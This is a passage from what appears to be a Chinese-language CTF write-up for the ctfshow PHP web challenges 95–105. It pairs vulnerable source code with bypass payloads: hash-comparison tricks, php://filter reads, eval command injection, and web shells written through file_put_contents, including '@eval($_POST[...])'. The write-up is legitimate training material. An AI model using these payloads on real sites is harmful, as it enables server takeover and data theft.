class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用八进制开头加号代替空格绕过?num=+010574</p><h1 id="web-96"><a href="#web-96" class="headerlink" title="web 96"></a>web 96</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>paylaod:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./flag.php</span><br><span class="line">/var/www/html/flag.php</span><br><span class="line">php://filter/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="web-97"><a href="#web-97" class="headerlink" title="web 97"></a>web 97</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>php中hash比较缺陷</p><p><a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value">md5强碰撞收集</a></p><p><a href="https://blog.csdn.net/EC_Carrot/article/details/109525162">【PHP】MD5比较漏洞 弱比较、强比较、强碰撞</a></p><p><a href="https://www.jianshu.com/p/c9089fd5b1ba">MD5碰撞的一些例子</a></p></blockquote><p>md5弱类型比较可以直接数组绕过，其结果都会转换为null</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><p>如果进行了string强制转类型后，则不再接受数组</p><p>弱碰撞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(  ($a!==$b) &amp;&amp; (md5($a)==md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">md5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。</span><br><span class="line">payload: a=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure><p>强碰撞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(  ($a!==$b) &amp;&amp; (md5($a)===md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">这时候需要找到两个真正的md5值相同数据</span><br><span class="line"></span><br><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure><h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.php.cn/php-weizijiaocheng-383293.html">php三元运算符与if的详解</a></p><p><a href="https://www.php.cn/php-notebook-172859.html">php函数的传值与传址(引用)详解</a></p><p>既然get传入的值会被定位指向到post所对应的值，那么只需要有get存在即可，同时post传入HTTP_FLAG=flag就可以了</p><h1 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    array_push(<span class="variable">$allow</span>, rand(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>array_push() 函数：向数组尾部插入一个或多个元素</p><p>rand() 函数随机生成数组rand(min,max)</p><p>file_put_contents() 函数：写入函数</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?n=<span class="number">5</span>.php</span><br><span class="line">content=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hack&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">content=<span class="meta">&lt;?php</span> system(<span class="string">&#x27;cat flag36d.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> ctfshow();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=is_numeric(<span class="variable">$v1</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.jb51.net/article/42425.htm">php中OR与|| AND与&amp;&amp;的区别总结</a></p><p>因为赋值的优先级(=)高于and所以 v 0 的 值 可 以 由 v0的值可以由 v0的值可以由v1来控制，所以我们需要给其赋值为1也就是true</p><p>因为flag在类ctfshow中，所以可以直接命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=var_dump($ctfshow)&amp;v3=;</span><br><span class="line">v1=1&amp;v2=system(&quot;cat ctfshow.php&quot;)/*&amp;v3=*/;</span><br></pre></td></tr></table></figure><h1 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> ctfshow();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=is_numeric(<span class="variable">$v1</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这里牵扯到的是一个反射类的问题</p><p><a href="https://ask.dcloud.net.cn/article/631">php反射类 ReflectionClass使用例子</a></p><p><a href="https://www.huaweicloud.com/articles/12460007.html">PHP的反射类ReflectionClass、ReflectionMethod使用实例</a></p><p><a href="https://learnku.com/articles/7538/the-application-of-reflection-in-php">反射在 PHP 中的应用</a></p><p>利用new一个反射类，直接打印其信息</p><p><strong>payload：</strong><code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class hacker&#123;</span><br><span class="line">public $hackername = &quot;yn8rt&quot;;</span><br><span class="line">const  yn8rt=&#x27;nb666&#x27;;</span><br><span class="line">public  function show()&#123;</span><br><span class="line">echo $this-&gt;name,&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">//有这么一个hacker类，假设我们不知道这个类是干什么用的，我们需要知道类里面的信息，这时候就需要用到ReflectionClass来对类进行反射</span><br><span class="line">//现在我可以通过反射来获取这个类中的方法，属性，常量</span><br><span class="line"></span><br><span class="line">//通过反射获取类的信息</span><br><span class="line"></span><br><span class="line">$reflection = new ReflectionClass(&#x27;hacker&#x27;);//实例化反射对象,映射hacker类的信息</span><br><span class="line">$consts = $reflection-&gt;getConstants();//获取所有常量</span><br><span class="line">$props = $reflection-&gt;getProperties();//获取所有属性</span><br><span class="line">$methods = $reflection-&gt;getMethods();//获取所有方法</span><br><span class="line">var_dump($consts);</span><br><span class="line">var_dump($props);</span><br><span class="line">var_dump($methods);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>返回值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [&quot;yn8rt&quot;]=&gt;</span><br><span class="line">  string(5) &quot;nb666&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  &amp;object(ReflectionProperty)#2 (2) &#123;</span><br><span class="line">    [&quot;name&quot;]=&gt;</span><br><span class="line">    string(10) &quot;hackername&quot;</span><br><span class="line">    [&quot;class&quot;]=&gt;</span><br><span class="line">    string(6) &quot;hacker&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  &amp;object(ReflectionMethod)#3 (2) &#123;</span><br><span class="line">    [&quot;name&quot;]=&gt;</span><br><span class="line">    string(4) &quot;show&quot;</span><br><span class="line">    [&quot;class&quot;]=&gt;</span><br><span class="line">    string(6) &quot;hacker&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果没有指定方法的话，就会像题目中默认输出很多东西：</p><p>1.常量 Contants<br>2.属性 Property Names<br>3.方法 Method Names静态<br>4.属性 Static Properties<br>5.命名空间 Namespace<br>6.Person类是否为final或者abstract<br>7.Person类是否有某个方法</p><h1 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = substr(<span class="variable">$v2</span>,<span class="number">2</span>);<span class="comment">// 这里的意思是从第二位开始截取</span></span><br><span class="line">    <span class="variable">$str</span> = call_user_func(<span class="variable">$v1</span>,<span class="variable">$s</span>);<span class="comment">// 回调函数，第一个参数为调用的函数，其余的为调用参数的值</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    file_put_contents(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/func-string-substr.html">PHP substr() 函数</a></p><p><a href="https://www.runoob.com/php/func-string-hex2bin.html">PHP hex2bin() 函数</a>：参数只有一个，将传入的参数(16进制转换为ascii字符)</p><p>首先还是赋值与and的优先级问题，所以就要保证v2传入的值为经过is_numeric函数判断后返回的结果为true，然后就是利用回调函数来实现读取操作</p><p>所以就可以这么利用啊：</p><p>post:v1=hex2bin</p><p>get：?v2=0x3c3f706870206576616c28245f504f53545b27796e275d293b3f3e&amp;v3=yn.php</p><p>上面的16进制解码ascii：<?php eval($_POST['yn']);?></p><p>但是有个什么问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(is_numeric(&quot;0x66&quot;));// 在php5中返回值为true</span><br><span class="line">var_dump(is_numeric(&quot;0x66&quot;));// 在php7中返回值为false</span><br></pre></td></tr></table></figure><p>本题的环境就是php7</p><p><strong>方法二</strong></p><p>利用<a href="https://so.csdn.net/so/search?q=base64&spm=1001.2101.3001.7020">base64</a>，同时配合伪协议去写入，但是需要保证通过is_number函数的判断，可以有字母啊，但是必得是e啊，也就是科学计数法啊，来自同一家的payload啊：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$a=&#x27;&lt;?=`cat *`;&#x27;;</span><br><span class="line">$b=base64_encode($a);  // PD89YGNhdCAqYDs=</span><br><span class="line">$c=bin2hex($b);      //这里直接用去掉=的base64</span><br><span class="line">输出   5044383959474e6864434171594473</span><br><span class="line"></span><br><span class="line">带e的话会被认为是科学计数法，可以通过is_numeric检测。</span><br><span class="line">大家可以尝试下去掉=和带着=的base64解码出来的内容是相同的。因为等号在base64中只是起到填充的作用，不影响具体的数据内容。</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br></pre></td></tr></table></figure><p>post：v1=hex2bin</p><p>然后访问1.php去触发就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;98ff0fa4-7a07-4277-b7da-b20802f852ca&#125;</span><br></pre></td></tr></table></figure><h1 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = substr(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = call_user_func(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">        file_put_contents(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>比上一题多过滤了一个php，只是为了让写入的文件中没有php，但是不影响我们，用上题的思路即可得到答案。</p><h1 id="web104-106"><a href="#web104-106" class="headerlink" title="web104 106"></a>web104 106</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1(<span class="variable">$v1</span>)==sha1(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://php.p2hp.com/manual/zh/function.sha1.php">sha1函数</a></p><p>没有强制类型转换的话，sha1是无法识别数组的，直接就是数组绕过了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">GET：?v2[]=1</span><br><span class="line">POST：v1[]=2</span><br></pre></td></tr></table></figure><h1 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span 